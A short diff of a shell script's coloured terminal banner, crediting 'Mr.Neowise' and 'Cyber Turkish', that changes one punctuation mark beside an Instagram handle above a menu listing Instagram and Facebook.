@@ -48,7 +48,7 @@ echo -e '\033[31;40;1m
 
 	   \e[35m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★ Mr.Neowise 🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
 	 \e[31m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★ Cyber Turkish 🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
-  \e[32m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★  İnstagram  :  @_serhatc  🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
+  \e[32m🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★  İnstagram  ;  @_serhatc  🇹🇷★ 🇹🇷★ 🇹🇷★ 🇹🇷★	
 '
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
